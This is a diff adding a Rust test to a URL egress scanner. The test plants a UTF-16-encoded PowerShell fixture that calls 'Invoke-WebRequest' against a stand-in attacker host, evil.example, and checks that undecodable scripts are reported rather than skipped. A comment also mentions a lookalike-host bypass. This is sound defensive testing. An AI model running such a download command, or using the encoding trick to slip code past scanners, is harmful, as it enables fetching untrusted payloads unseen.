@@ -71,6 +71,24 @@ fn the_url_scanner_accepts_the_allowlist() {
     assert_eq!(scan.files_scanned, 1);
 }
 
+#[test]
+fn the_url_scanner_reports_unreadable_source_instead_of_skipping_it() {
+    let dir = tempfile::tempdir().expect("temp dir");
+    let path = dir.path().join("fetch.ps1");
+    let mut bytes = vec![0xff, 0xfe];
+    for unit in "Invoke-WebRequest https://evil.example/download".encode_utf16() {
+        bytes.extend_from_slice(&unit.to_le_bytes());
+    }
+    std::fs::write(&path, bytes).expect("write UTF-16 script");
+
+    let error = egress::scan_tree_for_urls(dir.path())
+        .expect_err("a script the audit cannot decode must not yield a clean scan");
+    assert!(
+        error.to_string().contains("fetch.ps1"),
+        "the error must identify the unreadable file: {error:#}",
+    );
+}
+
 /// `http://127.0.0.1` as a prefix also matches `http://127.0.0.1.evil.com`.
 /// AC-21's source half is "no business domain"; a scanner that green-ticks a
 /// lookalike host is worse than no scanner.
